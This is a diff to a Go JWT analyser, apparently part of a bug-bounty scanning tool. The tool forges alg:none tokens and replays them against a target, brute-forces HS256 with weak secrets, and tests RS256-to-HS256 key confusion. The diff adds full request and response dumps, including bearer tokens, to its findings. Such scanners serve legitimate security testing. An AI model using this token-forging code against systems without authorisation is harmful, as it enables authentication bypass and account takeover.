@@ -1,7 +1,6 @@
 package tools
 
 import (
-	"github.com/Developer-Army/BBPTS/internal/domain/recon"
 	"context"
 	"crypto/hmac"
 	"crypto/rsa"
@@ -11,9 +10,11 @@ import (
 	"encoding/json"
 	"encoding/pem"
 	"fmt"
+	"github.com/Developer-Army/BBPTS/internal/domain/recon"
 	"io"
 	"log/slog"
 	"net/http"
+	"net/http/httputil"
 	"regexp"
 	"strings"
 	"sync"
@@ -49,18 +50,15 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, t
 
 		var tokens []string
 
-		// 1. Scan URL strings for embedded JWTs (query params, fragments)
 		if m := jwtRegex.FindAllString(target, -1); len(m) > 0 {
 			tokens = append(tokens, m...)
 		}
 
-		// 2. Fetch the HTTP response and scan headers + body for JWTs
 		if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") {
 			fetchedTokens := t.fetchAndScan(ctx, target)
 			tokens = append(tokens, fetchedTokens...)
 		}
 
-		// 3. Check context-provided headers (Authorization, Set-Cookie, etc.)
 		headers := scanCtx.Headers
 		for _, v := range headers {
 			if m := jwtRegex.FindString(v); m != "" {
@@ -72,7 +70,6 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, t
 			return nil, nil
 		}
 
-		// Deduplicate tokens
 		seen := make(map[string]bool)
 		var uniqueTokens []string
 		for _, tok := range tokens {
@@ -113,9 +110,8 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, t
 
 			alg, _ := headerJSON["alg"].(string)
 
-			// 1. Test None Algorithm and verify server-side acceptance.
 			forgedNoneToken := t.forgeNoneToken(parts[1])
-			if accepted, evidence := t.verifyForgedTokenAccepted(ctx, target, token, forgedNoneToken); accepted || (strings.ToLower(alg) == "none" && accepted) {
+			if accepted, evidence, reqDump, respDump := t.verifyForgedTokenAccepted(ctx, target, token, forgedNoneToken); accepted || (strings.ToLower(alg) == "none" && accepted) {
 				mu.Lock()
 				events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
 					"vuln_name":   "JWT None Algorithm Allowed",
@@ -124,13 +120,14 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, t
 					"forged":      forgedNoneToken,
 					"evidence":    evidence,
 					"description": "JWT signature verification bypassed using an 'alg:none' token accepted by the protected endpoint.",
+					"request":     reqDump,
+					"response":    respDump,
 				}, "critical"))
 				mu.Unlock()
 				slog.Warn("Found JWT vulnerability: None algorithm", "target", target)
 				continue
 			}
 
-			// 2. Test Weak HS256 Secrets
 			if strings.ToUpper(alg) == "HS256" {
 				weakSecrets := []string{"secret", "admin", "123456", "password", "jwt", "key", "root"}
 				for _, secret := range weakSecrets {
@@ -149,8 +146,6 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, t
 				}
 			}
 
-			// 3. RS256→HS256 Confusion Attack
-			// If algorithm is RS256, test if server accepts HS256 signed with the public key
 			if strings.ToUpper(alg) == "RS256" {
 				if pubKey, ok := headerJSON["x5c"]; ok {
 					if confused, evidence := t.testRS256toHS256Confusion(parts, pubKey); confused {
@@ -173,7 +168,6 @@ func (t *JWTAnalyzerTool) Run(ctx context.Context, scanCtx *recon.ScanContext, t
 	})
 }
 
-// fetchAndScan performs an HTTP GET and scans response headers and body for JWTs.
 func (t *JWTAnalyzerTool) fetchAndScan(ctx context.Context, target string) []string {
 	client := NewSafeHTTPClient(10 * time.Second)
 	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
@@ -197,7 +191,6 @@ func (t *JWTAnalyzerTool) fetchAndScan(ctx context.Context, target string) []str
 
 	var tokens []string
 
-	// Scan response headers for JWTs (Authorization, Set-Cookie, etc.)
 	for _, vals := range resp.Header {
 		for _, v := range vals {
 			if m := jwtRegex.FindString(v); m != "" {
@@ -206,7 +199,6 @@ func (t *JWTAnalyzerTool) fetchAndScan(ctx context.Context, target string) []str
 		}
 	}
 
-	// Scan response body for JWTs
 	body, err := io.ReadAll(io.LimitReader(resp.Body, 2*1024*1024))
 	if err != nil {
 		return tokens
@@ -223,30 +215,35 @@ func (t *JWTAnalyzerTool) forgeNoneToken(payload string) string {
 	return header + "." + payload + "."
 }
 
-func (t *JWTAnalyzerTool) verifyForgedTokenAccepted(ctx context.Context, target, originalToken, forgedToken string) (bool, string) {
+func (t *JWTAnalyzerTool) verifyForgedTokenAccepted(ctx context.Context, target, originalToken, forgedToken string) (bool, string, string, string) {
 	if forgedToken == "" || (!strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://")) {
-		return false, ""
+		return false, "", "", ""
 	}
 	unauthStatus := t.requestWithBearer(ctx, target, "")
 	originalStatus := t.requestWithBearer(ctx, target, originalToken)
-	forgedStatus := t.requestWithBearer(ctx, target, forgedToken)
+	forgedStatus, reqDump, respDump := t.requestWithBearerDump(ctx, target, forgedToken)
 	forgedOK := forgedStatus >= 200 && forgedStatus < 300
 	unauthDenied := unauthStatus == http.StatusUnauthorized || unauthStatus == http.StatusForbidden
 	originalOK := originalStatus >= 200 && originalStatus < 300
 	if forgedOK && (unauthDenied || originalOK || originalStatus == http.StatusUnauthorized || originalStatus == http.StatusForbidden) {
-		return true, fmt.Sprintf("unauth=%d original=%d forged_none=%d", unauthStatus, originalStatus, forgedStatus)
+		return true, fmt.Sprintf("unauth=%d original=%d forged_none=%d", unauthStatus, originalStatus, forgedStatus), reqDump, respDump
 	}
-	return false, ""
+	return false, "", "", ""
 }
 
 func (t *JWTAnalyzerTool) requestWithBearer(ctx context.Context, target, token string) int {
+	status, _, _ := t.requestWithBearerDump(ctx, target, token)
+	return status
+}
+
+func (t *JWTAnalyzerTool) requestWithBearerDump(ctx context.Context, target, token string) (int, string, string) {
 	client := NewSafeHTTPClient(10 * time.Second)
 	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
 		return http.ErrUseLastResponse
 	}
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
 	if err != nil {
-		return 0
+		return 0, "", ""
 	}
 	for k, v := range recon.HeadersFromCtx(ctx) {
 		if strings.EqualFold(k, "Authorization") {
@@ -257,13 +254,15 @@ func (t *JWTAnalyzerTool) requestWithBearer(ctx context.Context, target, token s
 	if token != "" {
 		req.Header.Set("Authorization", "Bearer "+token)
 	}
+	reqDump, _ := httputil.DumpRequestOut(req, true)
 	resp, err := client.Do(req)
 	if err != nil {
-		return 0
+		return 0, string(reqDump), ""
 	}
-	defer resp.Body.Close()
-	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 1024))
-	return resp.StatusCode
+	respDump, _ := httputil.DumpResponse(resp, false)
+	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
+	resp.Body.Close()
+	return resp.StatusCode, string(reqDump), string(respDump)
 }
 
 func (t *JWTAnalyzerTool) verifyHS256(header, payload, signature, secret string) bool {
@@ -273,9 +272,6 @@ func (t *JWTAnalyzerTool) verifyHS256(header, payload, signature, secret string)
 	return expected == signature
 }
 
-// testRS256toHS256Confusion tests if the server accepts HS256 signed with the RSA public key.
-// This is the "algorithm confusion" attack where an attacker switches from RS256 to HS256,
-// using the public key (from x5c header) as the HMAC secret.
 func (t *JWTAnalyzerTool) testRS256toHS256Confusion(parts []string, x5c interface{}) (bool, string) {
 	certChain, ok := x5c.([]interface{})
 	if !ok || len(certChain) == 0 {
@@ -287,7 +283,6 @@ func (t *JWTAnalyzerTool) testRS256toHS256Confusion(parts []string, x5c interfac
 		return false, ""
 	}
 
-	// Decode the certificate to extract the public key
 	certPEM := "-----BEGIN CERTIFICATE-----\n" + certStr + "\n-----END CERTIFICATE-----"
 	block, _ := pem.Decode([]byte(certPEM))
 	if block == nil {
@@ -304,20 +299,16 @@ func (t *JWTAnalyzerTool) testRS256toHS256Confusion(parts []string, x5c interfac
 		return false, ""
 	}
 
-	// Convert RSA public key to raw bytes for HMAC use
 	pubKeyBytes := pubKey.N.Bytes()
 
-	// Sign header.payload with HS256 using the raw public key bytes
 	mac := hmac.New(sha256.New, pubKeyBytes)
 	mac.Write([]byte(parts[0] + "." + parts[1]))
 	newSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
 
-	// If the new signature matches, the server accepted the confused algorithm
 	if newSig == parts[2] {
 		return true, "Public key bytes from x5c certificate used as HMAC secret"
 	}
 
-	// Also try with PEM-encoded public key
 	pubKeyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: x509.MarshalPKCS1PublicKey(pubKey)})
 	mac2 := hmac.New(sha256.New, pubKeyPEM)
 	mac2.Write([]byte(parts[0] + "." + parts[1]))
@@ -327,7 +318,6 @@ func (t *JWTAnalyzerTool) testRS256toHS256Confusion(parts []string, x5c interfac
 		return true, "PEM-encoded public key used as HMAC secret"
 	}
 
-	// Try with modulus as hex string
 	modHex := fmt.Sprintf("%x", pubKey.N)
 	mac3 := hmac.New(sha256.New, []byte(modHex))
 	mac3.Write([]byte(parts[0] + "." + parts[1]))
